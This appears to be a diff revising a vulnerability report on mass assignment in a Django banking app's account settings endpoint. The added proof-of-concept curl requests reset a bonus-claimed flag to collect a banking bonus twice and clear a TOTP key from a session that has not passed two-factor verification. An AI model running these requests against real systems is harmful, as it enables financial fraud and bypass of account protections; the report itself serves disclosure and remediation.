@@ -8,7 +8,7 @@ The vulnerability affects profile-level attributes, including `biography`, `pict
 
 The `bid` field is subject to a database-level uniqueness constraint (`Account/models.py:19-22`). A duplicate value causes an `IntegrityError` and an HTTP 500 response without changing the stored value.
 
-Although displayed as a Banking ID in the administration interface, `bid` is not used by the application's transfer or payment logic.
+Although displayed as a Banking ID in the administration interface, `bid` is not used by the application's transfer or payment logic (and is `null` for every account in the running instance).
 
 # Exploitation
 
@@ -27,15 +27,40 @@ CSRF=$(curl -s -b jar.txt -c jar.txt https://<TARGET>/account/settings/ \
 curl -s -b jar.txt -c jar.txt -X POST https://<TARGET>/account/settings/ \
   -H "Referer: https://<TARGET>/account/settings/" \
   --data-urlencode "csrfmiddlewaretoken=${CSRF}" \
-  --data-urlencode "new_username=attacker01" \
-  --data-urlencode "bid=<victim_bank_id>"
+  --data-urlencode "new_username=<own_username>" \
+  --data-urlencode "biography=mass-assigned" \
+  --data-urlencode "has_claimed_bonus=False"
+# 302 -> /account/settings/  (biography and has_claimed_bonus persisted)
 ```
 
-Testing confirmed unauthorised modification of attributes belonging to the authenticated user's own profile. The database-level uniqueness constraint on `bid` prevents duplicate identifiers from being stored. Attempts to modify `is_staff` were ignored.
+**Repeated banking bonus** — claim, reset the flag via mass assignment, claim again:
+
+```bash
+curl -s -b jar.txt -c jar.txt -X POST https://<TARGET>/banking/dashboard/ \
+  -H "Referer: https://<TARGET>/banking/dashboard/" \
+  --data-urlencode "csrfmiddlewaretoken=${CSRF}" --data-urlencode "action=claim_bonus"
+# balance 0 -> 150 NE; a second claim is refused ("already claimed")
+# re-send the settings request above with has_claimed_bonus=False, then claim again:
+# balance 150 -> 300 NE
+```
+
+**Clearing TOTP from a password-only session** — after logging in with only the password on an account that has `totp_key` set, `/account/` redirects to `/account/process` (TOTP pending), but `/account/settings/` has no 2FA check:
+
+```bash
+curl -s -b jar.txt -c jar.txt -X POST https://<TARGET>/account/settings/ \
+  -H "Referer: https://<TARGET>/account/settings/" \
+  --data-urlencode "csrfmiddlewaretoken=${CSRF}" \
+  --data-urlencode "new_username=<own_username>" \
+  --data-urlencode "totp_key="
+# 302 -> /account/settings/ ; /account/process/ now redirects to /account/ask-2fa (TOTP removed)
+```
+
+
+Testing confirmed unauthorised modification of attributes belonging to the authenticated user's own profile (`biography`, `has_claimed_bonus`, `totp_key`). The database-level uniqueness constraint on `bid` prevents duplicate identifiers from being stored. Attempts to modify `is_staff` / `is_superuser` were ignored (the request returns 302, but `/admin/` still redirects to `/admin/login/`).
 
 A financial integrity impact was confirmed in the banking bonus mechanism (`Bank/views.py:91-117`): a single account received the bonus more than once, with its balance increasing from 150 to 300 Neuros.
 
-Insufficient protection of account-security attributes was also confirmed.
+Insufficient protection of account-security attributes was also confirmed: `totp_key` can be set or cleared without password or TOTP confirmation, including from a session that has not yet completed TOTP verification (see PoC). Note that `GET /account/ask-2fa/no` independently clears `totp_key` from such a session, so this is not the only route to removing TOTP.
 
 The mass assignment vulnerability was confirmed through BunkerWeb over HTTP and HTTPS with CRS 4.26 operating in detection mode.
 
